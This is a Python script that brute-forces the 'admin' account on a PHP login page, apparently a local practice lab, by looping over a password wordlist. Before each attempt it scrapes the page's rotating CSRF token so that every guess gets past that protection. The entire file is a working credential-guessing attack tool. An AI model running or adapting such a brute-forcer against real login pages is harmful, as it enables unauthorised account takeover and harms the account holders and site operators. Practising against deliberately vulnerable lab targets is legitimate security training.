from sys import argv
import requests
from bs4 import BeautifulSoup as Soup
import time

script, passw, success_messagee = argv
txt = open(passw)

initToken = input("Enter initial token: ")

target = 'http://localhost:10009/login.php'
cookie = {'PHPSESSID': 'a7cb442347e58a79c119d95e62690f5e'}
ses = requests.Session()


def checkSuccess(html):
    # Ready for search
    soup = Soup(html,'html.parser')
    #check success mess
    search = soup.findAll(text=success_messagee)

    if search:
        success = True
    else:
        success = False

    return success

print(f"Target: {target}")


with open(passw) as p:
    print('Running brute force..')
    for password in p:
        print(f'password tryed: {password}')
        password = password.strip()
        payload = {'username': 'admin', 'password': password, 'user_token': initToken}
        req = ses.post(target, cookies=cookie, params=payload)

        res = req.text
        soup = Soup(res,'html.parser')
        csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        initToken = csrf_token
        print(f"CSRF Token = {csrf_token}")
        print(res)
        time.sleep(3)
        
        success = checkSuccess(req.text)

        if not success:
        # if it failed the CSRF token will be changed. Get the new one
            soup = Soup(req.text, 'html.parser')
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
        # Success! Show the result
            print(f"password is :{password}")
            break
     

# We failed, bummer. 
if not success:
  print ('Brute force failed. No matches found.')